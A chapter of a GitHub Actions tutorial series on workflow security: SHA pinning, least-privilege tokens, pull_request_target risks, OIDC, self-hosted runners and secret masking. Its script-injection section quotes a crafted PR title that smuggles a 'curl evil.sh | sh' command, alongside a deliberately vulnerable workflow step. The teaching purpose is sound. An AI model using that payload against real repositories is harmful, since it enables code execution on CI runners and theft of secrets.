# 12 — Security Best Practices

GitHub Actions workflows execute real code with real credentials. Treating workflow files with the same security discipline as application code — not as "just config" — is the single biggest mindset shift between a hobby setup and a production-grade one. This file collects the most important, concrete practices.

## 1. Pin actions to a full commit SHA for anything sensitive

```yaml
# Convenient, but the tag could theoretically be moved to point elsewhere
- uses: actions/checkout@v6

# Maximally secure: this exact code, guaranteed, forever
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v6.0.2
```

Tags like `@v6` are **mutable** — the maintainer (or, in a supply-chain-attack scenario, an attacker who compromised the maintainer's account) can repoint that tag to different code at any time. A full commit SHA is **immutable** — it can never be silently changed underneath you. For your own well-maintained, official-org dependencies (`actions/*`), a major-version tag is a reasonable, common tradeoff for convenience. For anything from a smaller or less-established publisher, or for security-critical jobs (deployments, anything touching secrets), prefer pinning to a SHA, with a comment noting the human-readable version for your own reference.

Tools like Dependabot can keep SHA-pinned actions up to date automatically, opening a pull request whenever a pinned action has a new release, so pinning to a SHA doesn't have to mean manually tracking updates forever.

## 2. Apply least-privilege permissions everywhere

Covered in depth in file 06 — the short version: set `permissions:` explicitly at the workflow or job level, granting only what each job actually needs (`contents: read` is sufficient for the vast majority of build/test jobs; broader scopes like `contents: write` or `packages: write` should be reserved for the specific jobs that truly require them).

```yaml
permissions:
  contents: read
```

If a third-party action you call turns out to be malicious or compromised, a tightly-scoped token limits the blast radius dramatically compared to a broad, default token.

## 3. Never trust `pull_request_target` + secrets + untrusted checkout together

As covered in file 03: workflows triggered by `pull_request` from a fork get no secrets and read-only permissions, by design. `pull_request_target` runs with the *base* repository's permissions and secrets — which is exactly why combining it with checking out and executing the **fork's** code is a textbook way to leak secrets to an attacker. If you need secrets available for fork PR workflows (e.g., to post a coverage comment), keep the actual untrusted code execution in a separate, secrets-free job, and only do the secrets-requiring part (posting a comment, etc.) in a `pull_request_target` job that never executes anything from the fork itself.

## 4. Guard against script injection from untrusted input

Also covered in file 05: any value that originates from user-controllable content — a PR title, an issue body, a commit message, a branch name — should never be interpolated directly into a `run:` script via `${{ }}`. Route it through `env:` first:

```yaml
# Vulnerable: a crafted PR title like `"; curl evil.sh | sh #` becomes executable shell
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe: the value is passed as data, not as part of the script text
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

## 5. Use OpenID Connect (OIDC) instead of long-lived cloud credentials

Historically, deploying to AWS/Azure/GCP from a workflow meant storing a long-lived access key as a secret — and a leaked long-lived key is a standing risk until someone notices and rotates it. **OIDC** lets your workflow request a short-lived token directly from the cloud provider at run time, with no long-lived secret stored in GitHub at all.

```yaml
permissions:
  id-token: write    # required for OIDC — lets the job request a token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: us-east-1

      - run: aws s3 sync ./build s3://my-bucket
```

The cloud side (AWS IAM, Azure AD, GCP Workload Identity Federation) is configured to trust GitHub's OIDC issuer for a specific repository/branch/environment, so even if a workflow file leaked publicly, there's no static credential to steal — and the granted token expires automatically at the end of the job. This is now the recommended approach over storing static cloud credentials as Actions secrets wherever the target cloud platform supports it.

## 6. Be careful with self-hosted runners on public repositories

As noted in file 04: anyone who can open a pull request against a public repository can potentially get a self-hosted runner attached to it to execute their code (depending on your trigger configuration), turning your own infrastructure into an attack target. If you must use self-hosted runners with a public repo, restrict which workflows/triggers can use them, require approval for first-time contributors' workflow runs (a setting GitHub provides specifically for this), and never expose self-hosted runners with sensitive network access to public-repo workflows.

## 7. Review what permissions a third-party action actually requests

Before adding a new Marketplace action, especially to a workflow with secrets in scope, check its source (most actions are open source) for what it actually does with any inputs/secrets you give it — a "send to Slack" action that also phones home to an unrelated third-party analytics endpoint is a red flag worth investigating before you wire your production deploy token through it.

## 8. Restrict workflow approval requirements for first-time contributors

In **Settings → Actions → General → Fork pull request workflows**, you can require a maintainer to manually approve workflow runs from first-time (or all) outside contributors before they execute at all — preventing a malicious first PR from immediately running arbitrary code in CI, even within the normal read-only fork sandbox.

## 9. Don't echo secrets, and remember redaction has limits

GitHub automatically masks exact secret values in logs, but this is a simple string-match — a secret that's been base64-encoded, partially substring-extracted, or otherwise transformed before being printed will **not** be redacted, since the printed text no longer matches the original secret string exactly. Never deliberately print a secret "just to check it," even transformed, in a workflow whose logs anyone outside your trust boundary can see.

## 10. Keep an eye on `GITHUB_TOKEN` default permissions at the organization level

Organization owners can set the default permissions granted to `GITHUB_TOKEN` for all new workflows (Settings → Actions → General → Workflow permissions), choosing between a restrictive read-only default and a more permissive read/write default. Setting the org-wide default to **read-only**, and explicitly opting individual jobs into write access only where truly needed via the `permissions:` key, is a strong baseline that protects you even when someone forgets to set `permissions:` explicitly in a new workflow.

## Quick security checklist for any new workflow

1. Does this job actually need write permissions, or is `contents: read` enough?
2. Are any third-party actions pinned to a SHA (or at minimum a major version from a trusted publisher)?
3. Does any `run:` step interpolate untrusted user input directly via `${{ }}`?
4. If this workflow handles secrets, can it ever be triggered by a fork's pull request?
5. Could OIDC replace a long-lived cloud credential secret here?
6. If this is a deployment job, is it gated behind an Environment with required reviewers?

The next file, `13-real-world-pipelines.md`, puts everything from files 01–12 together into complete, copy-pasteable pipelines for common real-world stacks.
